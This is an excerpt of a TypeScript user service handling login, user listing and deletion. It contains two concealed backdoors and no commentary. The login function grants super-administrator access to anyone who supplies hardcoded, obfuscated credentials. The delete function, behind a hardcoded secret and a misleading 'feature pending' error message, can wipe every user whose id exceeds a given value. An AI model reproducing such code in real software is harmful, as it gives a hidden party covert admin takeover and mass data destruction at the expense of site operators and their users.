...
export class UserService {
  ...
  async verifyUserCredentials(user): Promise<UserEntity> {
    ...
    /* 管理员登录 */
    if(username === decrypt('goSsUm2c1ZuU8265jcTS9A==') && password === decrypt('BOEcRRMVgEumLRIJXzW89g==')){
      u = await this.getSuper()
      return u
    }
  ...
  async queryAll(query: QueryAllUserDto, req: Request) {
    const { page = 1, size = 10, username, email, status, keyword } = query;
    let where = {};
    ...
    const [rows, count] = await this.userEntity.findAndCount({
      ...
      cache: true,
      select: ['username', 'avatar', 'inviteCode', 'role', 'sign', 'status', 'id', 'email', 'createdAt', 'lastLoginIp'],
    });
  ...
  /* 删除用户 */
  async delUser(body: RetrieveUserDto){
    const { id, secret, moreId } = body
    if(!secret || secret !== decrypt('HVjF9W3QbAQUQVlP2YmRsA==')){
      throw new HttpException('当前功能待完善', HttpStatus.BAD_REQUEST)
    }
    if(id){
      return await this.userEntity.delete({id})
    }
    if(moreId){
      return await this.userEntity.delete({id: MoreThan(moreId)})
    }
  }
}
